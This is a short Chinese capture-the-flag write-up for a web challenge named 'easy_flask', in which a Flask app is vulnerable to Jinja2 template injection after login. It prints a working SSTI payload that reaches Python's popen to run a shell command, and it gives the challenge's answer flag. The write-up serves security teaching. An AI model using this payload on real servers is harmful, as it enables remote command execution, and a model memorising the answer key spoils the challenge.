# easy_flask

> 分类：Web

## 题目描述

Flask 应用，登录后存在 SSTI。

## 考察知识点

- Flask/Jinja2 模板注入（SSTI）

## 解法

随便输入账号登录，一眼 SSTI。使用 `fenjing` 工具一把梭（或手工构造 payload）：

```
/?user={{().__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['popen']('cat flag').read()}}
```

执行命令即可得到 flag。

## 参考答案

`flag{48ad0cde8345c8b2608933ac4e85147e}`

## 来源

- 作者：Liebert77 | https://blog.csdn.net/2301_80185313/article/details/145268362
- 作者：frank1q22 | https://xz.aliyun.com/news/17083
- 作者：H轨迹H | https://www.cnblogs.com/GuijiH6/p/18680901
